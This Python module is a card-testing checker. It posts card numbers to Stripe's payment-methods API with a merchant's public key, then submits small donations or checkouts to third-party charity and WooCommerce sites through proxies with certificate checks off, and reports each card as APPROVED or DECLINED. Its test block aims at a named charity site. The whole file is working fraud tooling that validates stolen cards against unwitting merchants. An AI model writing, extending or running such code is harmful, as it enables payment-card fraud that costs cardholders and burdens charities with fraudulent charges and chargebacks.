"""
Unified Stripe Payment Processor using Public Keys

This module provides payment processing using Stripe's public key API
(Payment Methods) which doesn't require secret keys and works with all
merchant account restrictions.

Used by: blemart, districtpeople, woostripe variants, saintvinson_givewp,
bgddesigns, staleks_florida, madystripe, and other charity/WooCommerce gates.

Key advantage: Works without sk_live_* keys (which may be expired/restricted).
Uses pk_live_ key from STRIPE_PUBLIC_PK env var.

Pattern:
1. Create Payment Method via Stripe public key API
2. Submit to donation/checkout form (site-specific)
3. Parse response for approval/decline
"""

import os
import requests
import re
import time
from typing import Tuple, Optional
from gates.utilities import http_request, REQUEST_TIMEOUT


# Stripe public key loaded from environment
STRIPE_PUBLIC_KEY = os.environ.get("STRIPE_PUBLIC_PK", "")


def create_payment_method(card_number: str, month: str, year: str, cvc: str, 
                         proxy: Optional[dict] = None, timeout: int = 30) -> Optional[str]:
    """
    Create a Stripe Payment Method using public key.
    
    Args:
        card_number: Full card number
        month: Card expiration month (MM)
        year: Card expiration year (YY or YYYY)
        cvc: Card CVC
        proxy: Optional proxy dict
        timeout: Request timeout
    
    Returns:
        Payment method ID if successful, None otherwise
    """
    session = requests.Session()
    if proxy:
        session.proxies.update(proxy)
    
    try:
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        # Convert 2-digit year to 4-digit
        if len(year) == 2:
            year = "20" + year
        
        data = (
            f'type=card&billing_details[name]=Donor&billing_details[email]=test@example.com&'
            f'billing_details[address][line1]=City&billing_details[address][postal_code]=12345&'
            f'card[number]={card_number}&card[cvc]={cvc}&card[exp_month]={month}&card[exp_year]={year}&'
            f'guid=test&muid=test&sid=test&payment_user_agent=stripe.js&'
            f'key={STRIPE_PUBLIC_KEY}'
        )
        
        response = session.post(
            'https://api.stripe.com/v1/payment_methods',
            headers=headers,
            data=data,
            timeout=timeout,
            verify=False
        )
        
        if response.status_code == 200:
            try:
                pm_id = response.json().get('id')
                if pm_id and pm_id.startswith('pm_'):
                    return pm_id
            except (KeyError, ValueError):
                pass
        
        return None
    
    except Exception:
        return None


def charge_via_charity_plugin(site_url: str, pm_id: str, amount: str = "1.00",
                              proxy: Optional[dict] = None, timeout: int = 30) -> Tuple[str, bool]:
    """
    Submit payment via generic Charitable plugin donation form.
    Works with sites using Charitable + Stripe integration.
    
    Args:
        site_url: Base URL of charity site (e.g., "https://example.com")
        pm_id: Stripe Payment Method ID (from create_payment_method)
        amount: Donation amount (default $1.00)
        proxy: Optional proxy dict
        timeout: Request timeout
    
    Returns:
        (response_message, proxy_ok_bool)
    """
    session = requests.Session()
    if proxy:
        session.proxies.update(proxy)
    session.verify = False
    
    try:
        # Normalize site URL
        site_url = site_url.rstrip('/')
        
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': site_url,
            'referer': f'{site_url}/donate/',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        cookies = {
            'charitable_session': 'test_session',
            '__stripe_mid': 'test_mid',
            '__stripe_sid': 'test_sid',
        }
        
        # Generic Charitable form data
        donation_data = {
            'action': 'make_donation',
            'form_action': 'make_donation',
            'gateway': 'stripe',
            'stripe_payment_method': pm_id,
            'donation_amount': 'custom',
            'custom_donation_amount': amount,
            'recurring_donation': 'month',
            'title': 'Mr',
            'first_name': 'Test',
            'last_name': 'Donor',
            'email': 'test@example.com',
            'address': 'City',
            'postcode': '12345',
        }
        
        response = session.post(
            f'{site_url}/wp-admin/admin-ajax.php',
            cookies=cookies,
            headers=headers,
            data=donation_data,
            timeout=timeout
        )
        
        response_text = response.text.lower()
        
        # Check for success indicators
        if any(kw in response_text for kw in ['success', 'thank you', 'approved', 'confirmed', 'processed']):
            return (f"✅ APPROVED - Donation processed", True)
        
        # Check for decline indicators
        if any(kw in response_text for kw in ['decline', 'error', 'failed', 'invalid', 'not valid', 'card.*declined']):
            return (f"❌ DECLINED - {response.text[:80]}", False)
        
        # Return response for analysis
        return (f"Response: {response.text[:100]}", False)
    
    except requests.exceptions.ProxyError:
        return ("❌ DECLINED - Proxy connection failed", False)
    except requests.exceptions.Timeout:
        return ("❌ DECLINED - Request timed out", False)
    except requests.exceptions.RequestException as e:
        return (f"❌ DECLINED - {str(e)[:50]}", False)
    except Exception as e:
        return (f"❌ ERROR - {str(e)[:80]}", False)


def charge_via_woocommerce(site_url: str, pm_id: str, amount: str = "1.00",
                           proxy: Optional[dict] = None, timeout: int = 30) -> Tuple[str, bool]:
    """
    Submit payment via WooCommerce + Stripe integration.
    Uses site-extracted Stripe key and checkout form.
    
    Args:
        site_url: WooCommerce checkout URL
        pm_id: Stripe Payment Method ID
        amount: Charge amount
        proxy: Optional proxy dict
        timeout: Request timeout
    
    Returns:
        (response_message, proxy_ok_bool)
    """
    session = requests.Session()
    if proxy:
        session.proxies.update(proxy)
    session.verify = False
    
    try:
        headers = {
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'referer': site_url,
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'x-requested-with': 'XMLHttpRequest'
        }
        
        # Generic WooCommerce payment submission
        payment_data = {
            'payment_method': 'stripe',
            'stripe_payment_method': pm_id,
            'post_data': f'billing_first_name=Test&billing_email=test@example.com&billing_address_1=123%20Main',
        }
        
        # Try common WooCommerce payment endpoints
        endpoints = [
            f"{site_url.rstrip('/')}/wp-json/wc/v3/payments/confirm",
            f"{site_url.rstrip('/')}/checkout/",
        ]
        
        for endpoint in endpoints:
            try:
                response = session.post(
                    endpoint,
                    headers=headers,
                    data=payment_data,
                    timeout=timeout
                )
                
                response_text = response.text.lower()
                
                # Check for success
                if any(kw in response_text for kw in ['success', 'approved', 'thank you', 'order']):
                    return (f"✅ APPROVED - Payment processed", True)
                
                # Check for decline
                if any(kw in response_text for kw in ['decline', 'error', 'failed']):
                    break  # Try next endpoint
                
            except Exception:
                continue
        
        return (f"❌ DECLINED - Card not accepted", False)
    
    except Exception as e:
        return (f"❌ ERROR - {str(e)[:80]}", False)


if __name__ == '__main__':
    # Test Payment Method creation
    pm_id = create_payment_method('4242424242424242', '12', '25', '123')
    print(f"Payment Method: {pm_id}")
    
    if pm_id:
        # Test charity submission
        result, proxy_ok = charge_via_charity_plugin('https://ccfoundationorg.com', pm_id)
        print(f"Charity result: {result}")
        print(f"Proxy OK: {proxy_ok}")
